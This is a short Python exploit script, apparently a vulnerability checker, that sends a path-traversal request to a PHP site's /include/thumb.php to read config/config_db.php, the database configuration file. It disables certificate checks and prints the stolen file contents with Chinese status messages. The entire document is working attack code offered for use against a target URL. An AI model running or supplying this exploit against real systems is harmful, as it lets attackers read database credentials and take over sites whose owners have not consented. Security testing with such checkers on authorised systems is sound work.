#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/include/thumb.php?dir=http/.....///.....///config/config_db.php"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"}
    r = requests.get(burp0_url, headers=burp0_headers,verify=False)
    if "<?php" in r.text:
        return r.text
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取文件 config_db.php 结果为：", info)
    else:
        print("[-]漏洞不存在")
